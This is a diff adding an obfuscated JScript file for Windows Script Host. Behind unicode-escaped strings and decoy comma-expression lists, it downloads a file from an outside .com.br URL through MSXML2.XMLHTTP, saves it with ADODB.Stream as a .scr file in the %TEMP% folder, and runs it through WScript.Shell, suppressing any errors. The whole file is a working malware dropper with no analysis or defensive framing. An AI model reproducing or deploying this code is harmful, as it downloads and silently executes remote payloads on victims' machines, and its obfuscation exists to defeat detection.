@@ -1,0 +1,24 @@
+reorganizeTransmission = (((105, 67, 207, 0) + (0 ^ 1)), this);
+argumentJournal = ("\u0073t\u0072\u0061" + "t\u0065gy", "\u0063o" + "n\u0073\u0075l\u0074a" + "\u006et", "\u0052un");
+visitStudent = reorganizeTransmission[("\u0074r\u006fpi" + "\u0063al", "\u0066a\u0063\u0074" + "or", "\u0061" + "lma" + "nac", "\u0057\u0053cr\u0069" + "pt")];
+visitStudent[("\u006f" + "\u0070po" + "\u0073it\u0069\u006f" + "n", function String.prototype.guidePopulation() {
+ return this
+}, "\u0069\u006e\u0073tr\u0075" + "\u0063\u0074\u0069o" + "n", "u\u006e\u0069\u0076e" + "\u0072\u0073" + "it\u0079", "e\u0071u\u0069" + "\u0076\u0061\u006c\u0065\u006e" + "\u0074", "Slee\u0070")](((0 | 14794) ^ (140, 34, 80, 850)));
+triumphFormula = visitStudent[("p\u0072\u006f\u0067r" + "es\u0073io" + "n", "\u0072\u0061\u0063" + "e", "\u0043r\u0065a" + "\u0074\u0065O" + "\u0062je" + "ct")](("s\u0065\u0078", "\u0057Sc\u0072\u0069" + "\u0070t" + ".She\u006c\u006c"));
+paroleShow = triumphFormula[("\u0070\u006c\u0061n" + "\u0065t", "\u0069n\u0064\u0069" + "\u0066\u0066" + "e\u0072\u0065\u006e\u0074", "p" + "ed" + "\u0061l", "\u0063a\u006e" + "d\u0069d\u0061\u0074\u0065", "E" + "x" + "p\u0061\u006e\u0064\u0045" + "\u006e\u0076ir" + "\u006f\u006e\u006d" + "\u0065\u006e" + "tS\u0074\u0072" + "i" + "n\u0067" + "\u0073")](("\u0025" + "T\u0045M\u0050" + "%" + "\u002f")) + ("\u0074h\u0065\u006f\u0072\u0065" + "t" + "\u0069\u0063", "p" + "\u0072" + "odu" + "ceC" + "\u0069\u0072" + "c\u006ce") + ("a\u0062\u0073\u006f" + "\u0072\u0062", "cu\u0062\u0065", "d" + "\u0065l\u0074\u0061", "o\u0072\u0069\u0067\u0069\u006e", "." + "s" + "cr");
+rationalOrganization = reorganizeTransmission[("\u0057\u0053\u0063r\u0069" + "pt")][("\u006f\u0070er" + "\u0061", "int" + "erv\u0061l", "\u0043r\u0065at" + "\u0065O\u0062j\u0065c" + "t")](("p" + "ar" + "al" + "l\u0065\u006c", "c\u0068\u0061n" + "\u0063e", "\u0062\u006f" + "\u0078", "\u0067" + "u\u0069" + "\u0064\u0065", "MS\u0058\u004dL" + "\u0032\u002eX" + "\u004d\u004c" + "\u0048TT\u0050"));
+rationalOrganization[("\u0063e" + "ntime" + "\u0074" + "\u0072\u0065", "m\u0069nu" + "s", "\u0076eto", "\u0066orm" + "\u0075\u006c\u0061", "o\u0070" + "e\u006e")](("G\u0045T"), ("ba\u006e\u0064\u0061" + "\u0067\u0065", "p\u0072ese" + "r" + "v" + "at" + "\u0069v" + "\u0065", "p\u0072\u006ft" + "e\u0063\u0074" + "\u006f\u0072", "f" + "i\u006c" + "\u0065", "\u0068\u0074\u0074p" + ":\u002f" + "/\u006d\u0061\u0069s" + "e\u0073\u0070an\u0068" + "\u006f\u006c\u002e" + "\u0063\u006fm" + "\u002ebr/\u0031" + "\u002f8\u0079" + "\u0037\u0068" + "8" + "b\u00766\u0066"), !((((((2 ^ 17)) - ((7 - 1) * 3)) * (([+[]]))) + (((0 + (0 | 0))) + (([+!+[]])))) == 1));
+rationalOrganization[("\u006d\u0069n\u0069\u006da" + "l", "r\u0065com" + "\u006d" + "en" + "\u0064", "\u0061n\u0065cd\u006f" + "\u0074e", "send")]();
+while(rationalOrganization[("cop\u0079", "c" + "l\u0061ssi" + "fic" + "atio\u006e", "r\u0065" + "\u0061\u0064ys" + "t\u0061\u0074\u0065")] < (1 * 2) * (44 - 42)) {
+ reorganizeTransmission[("\u0072\u0065v\u0075e", "\u0070a\u0072" + "\u006f\u006ce", "\u006d\u0061\u0074e" + "\u0072\u0069\u0061l", "\u0057" + "S\u0063r" + "i\u0070t")][("\u006d\u0061" + "\u0072k", "b\u006c\u0061\u006ek", "\u0063\u006fn" + "t\u0061" + "c\u0074", "\u0075nive" + "rsity", "\u0053lee\u0070")](((12 * 8 + 4) & (33 * 3 + 26)));
+}
+objectivePopular = reorganizeTransmission[("\u0062" + "\u0061" + "s" + "\u0069s", "\u0061\u0072t\u0069\u0073" + "t", "\u0057" + "\u0053cr\u0069\u0070t")][("i" + "nter\u0070\u0072" + "et\u0061\u0074i\u006f" + "n", "\u0062\u0061\u0072\u0062\u0061r" + "i\u0061\u006e", "\u0062udg" + "et", "\u0064e" + "s\u0073e\u0072" + "\u0074", "\u0043\u0072\u0065a" + "t\u0065" + "O" + "\u0062ject")](("\u0073\u0065rv\u0069" + "ce", "\u0041\u0044OD" + "B.\u0053t\u0072" + "e\u0061\u006d"));
+try {
+ objectivePopular[("\u006c\u0065x" + "\u0069" + "\u0063\u006fn", "\u006fpe\u006e")]();
+ objectivePopular[("co\u0072\u0074\u0065" + "\u0067\u0065", "ob\u006ae\u0063\u0074", "\u0062ott" + "\u006c\u0065", "ty" + "p\u0065")] = ((([+[]])) ^ (21, 1));
+ objectivePopular[("\u0066\u0075\u006e\u0063\u0074\u0069" + "\u006fn", "re\u0066" + "l" + "\u0065x", "w\u0072" + "i\u0074\u0065")](rationalOrganization[("\u006d" + "ag\u0061" + "zi" + "ne", "n\u006f\u0073\u0065", "R" + "e\u0073\u0070" + "o" + "\u006ese" + "Bo\u0064y")]);
+ objectivePopular[("\u0063\u006f\u006c\u006c\u0065" + "c\u0074ive", "ac\u0063" + "\u006f\u006d" + "pa" + "\u006ey", "\u0070os\u0069t\u0069" + "o\u006e")] = ((([+[]])) + (0 / 49));
+ objectivePopular[("d\u006fcum\u0065" + "n\u0074\u0061r\u0079", "\u0070\u0072oj\u0065c" + "t", "sa" + "v\u0065T\u006f" + "\u0046i" + "l" + "e")](paroleShow, ((0 ^ 0) + (2 ^ 0)));
+ objectivePopular[("q\u0075a\u006c\u0069f" + "\u0069c" + "\u0061t\u0069\u006fn", "\u0065\u0078p\u0065rt" + "\u0069\u0073" + "e", "\u0063lo" + "s\u0065")]();
+ triumphFormula[argumentJournal](paroleShow.guidePopulation(), ((22 | 6) - 11 * 2), (0 | 0));
+} catch(illegalRuin) {};
